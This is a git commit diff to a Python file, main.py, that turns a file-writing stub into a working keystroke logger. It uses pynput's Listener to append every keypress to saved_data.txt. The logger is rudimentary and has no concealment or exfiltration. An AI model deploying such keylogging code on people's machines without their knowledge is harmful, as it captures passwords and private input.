8f809515390254ac1989f9a058151f741cf5bff8
Que0 <zzapass0@gmail.com>
2021-11-28 02:11:16 +0100

    Some changes

--- main.py
+++ main.py
@@ -2,8 +2,8 @@ from os import write
 from pynput.keyboard import Listener
 
 def write_to_file(data):
-    with open("saved_data.txt","w") as f:
+    with open("saved_data.txt","a") as f:
         f.write(str(data))
-        f.close()
 
-write_to_file("dasda")
+with Listener(on_press=write_to_file) as l:
+    l.join()
